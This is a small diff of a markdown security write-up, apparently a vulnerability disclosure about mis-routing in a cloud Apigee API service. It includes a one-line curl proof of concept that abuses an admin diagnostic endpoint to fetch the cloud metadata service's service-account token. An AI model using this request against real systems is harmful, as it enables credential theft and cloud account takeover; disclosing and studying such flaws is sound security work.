@@ -2,7 +2,7 @@
 
 ## 0x0C CVE-/-/ - Mis-routing in a top 5 Cloud Apigee service is a **Intended Behavior**?
 
-**1-Line curl, unauthenticated attacker could manipulate **Cloud Apigee Api-Routing to Full Application and Cloud Asset Takeover**
+**1-Line curl**, unauthenticated attacker could manipulate **Cloud Apigee Api-Routing to Full Application and Cloud Asset Takeover**
 
 ```bash
 curl "https://<vulnerable-apigee-service>/<public-api>/<crafted-uri>/<admin-api>/diag-curl?url=http://metadata.******.internal/computeMetadata/v1/instance/service-accounts/default/token"
